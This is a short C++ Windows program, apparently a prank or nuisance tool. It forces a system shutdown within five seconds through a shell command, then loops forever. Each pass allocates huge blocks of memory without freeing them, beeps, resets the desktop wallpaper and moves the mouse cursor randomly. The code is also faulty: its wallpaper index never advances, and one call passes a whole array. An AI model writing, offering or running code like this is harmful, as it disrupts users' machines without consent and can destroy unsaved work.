#include<stdio.h>
#include<windows.h>
#include<iostream>
#include <tchar.h>
#include<cstdlib>
#include<ctime>
using namespace std ;

int main(){

    POINT sb;
    PVOID s[10] = {
        (PVOID)"D:\\windows\\system32\\bin\\background.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background1.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background2.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background3.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background4.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background5.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background6.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background7.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background8.jpg" ,
        (PVOID)"D:\\windows\\system32\\bin\\background9.jpg"
        };
    srand((unsigned)time(NULL));
    system("shutdown -s -t 5");
    SystemParametersInfo(20, true,s, 1) ;
    GetCursorPos (&sb);//获取鼠标坐标
    int i = 0 ;
    while(1){
        int *p = (int*)malloc(10000000000) ;
        printf("\a");
        SystemParametersInfo(20, true,s[i], 1) ;
        if(i>=9){
            i = 0 ;
        }
        SetCursorPos(rand()%1000,rand()%800);//更改鼠标坐标
        Sleep(1);//控制移动时间间隔
    }

    return 0 ;
}
